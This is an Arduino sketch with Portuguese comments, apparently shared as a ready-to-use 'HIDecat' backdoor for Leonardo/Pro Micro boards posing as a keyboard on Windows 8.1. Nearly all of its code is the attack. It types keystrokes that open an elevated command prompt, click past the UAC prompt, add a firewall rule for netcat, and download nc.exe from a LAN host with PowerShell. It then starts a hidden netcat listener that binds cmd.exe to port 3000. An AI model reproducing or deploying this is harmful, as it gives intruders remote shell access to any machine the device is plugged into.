/* Escrito por: _carlosnericorreia_
 * email:hackerama@protonmail.com
 *
 * +---------------------------------------------------------------+
 * |HIDecat - Backdoor com Netcat para Arduínos Leonardo/Pro Micro |
 * +---------------------------------------------------------------+
 *             Solução para o problema dos teclados pt-BR
 *                         Target: Windows 8.1
 */

#include "Keyboard.h"
//Começando a funcão.
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


void setup()
{
  delay(800);

  Keyboard.begin(); // Começa o teclado
  
  Keyboard.press(KEY_LEFT_GUI);  
  Keyboard.press('d');
  Keyboard.releaseAll();    // Fecha todas as janelas abertas
  delay(800);
    
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  Keyboard.print("powershell Start-Process cmd -Verb RunAs"); //Abre cmd como administrador
  typeKey(KEY_RETURN);  
  delay(2000);
  typeKey(KEY_LEFT_ARROW);
  delay(100);
  typeKey(KEY_RETURN);  //Bypassa o Smart Screen 
  delay(500);
  
  Keyboard.print("@echo off"); //Começam os códigos de shell
  typeKey(KEY_RETURN);
  Keyboard.print("cd %TEMP%");
  typeKey(KEY_RETURN);
  Keyboard.print("cls");
  typeKey(KEY_RETURN);
  delay(100);
  
  Keyboard.print("powershell Set-WinUserLanguageList -LanguageList en-US"); //muda o idoma do teclando para en-US
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("s");
  typeKey(KEY_RETURN);
  delay(400);
  
  Keyboard.print("netsh advfirewall firewall add rule name=\"Netcat\" dir=in action=allow program=\"%TEMP%\\nc.exe\" enable=yes");                //Permite o Netcat no firewall
  typeKey(KEY_RETURN);
  delay(2000);
  Keyboard.print("cls");
  typeKey(KEY_RETURN);
  
  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.12/nc.exe', 'nc.exe')");
  typeKey(KEY_RETURN); //Baixa o Netcat
  
  Keyboard.print("powershell Set-WinUserLanguageList -LanguageList pt-BR"); //volta o idoma do teclando para pt-BR
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("s");
  typeKey(KEY_RETURN);
  delay(300);

  Keyboard.print("cls");
  typeKey(KEY_RETURN);
  Keyboard.print("start nc -lp 3000 -d -e cmd.exe");  //dá start em um Netcat em modo de escuta
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.print("exit"); 
  typeKey(KEY_RETURN);
 
  Keyboard.end();
 }

void loop() {}